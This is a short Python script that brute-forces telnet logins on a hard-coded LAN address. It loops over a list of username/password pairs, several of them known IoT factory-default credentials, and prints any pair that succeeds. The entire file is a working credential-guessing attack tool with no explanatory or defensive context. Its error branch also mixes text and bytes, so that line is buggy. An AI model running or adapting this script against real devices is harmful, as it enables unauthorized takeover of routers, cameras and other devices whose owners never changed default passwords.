'''
@author: wardog

^ ^
o O
\./

'''

import telnetlib

host = "192.168.7.112"

timeout = 3
timeoutPassword = 10

print("Try login on : " + host)

loginPasswords = [
("test","xc3511"),
("plop","vizxv"),
("telnetuser","telnetpassword")]

for loginPassword in loginPasswords:

	print("Trying with : " + str(loginPassword))
	
	login = loginPassword[0].encode('ascii')
	password = loginPassword[1].encode('ascii')

	tn = telnetlib.Telnet(host)

	result = tn.read_until(b"login: ",timeout)
	tn.write(login + b"\n")

	result = tn.read_until(b"Password:",timeout)

	
	if result.endswith(b"Password:"):
		tn.write(password + b"\n")
		result = tn.read_until(b"incorrect", timeoutPassword)
		print("bad try...")
		
		if not result.endswith(b"incorrect"):
			print("Login/Password found : " + str(login) + "/" + str(password))
		
	else:
		print("Unexpected : " + result)
	
	tn.close()
	
print("End")	
	
	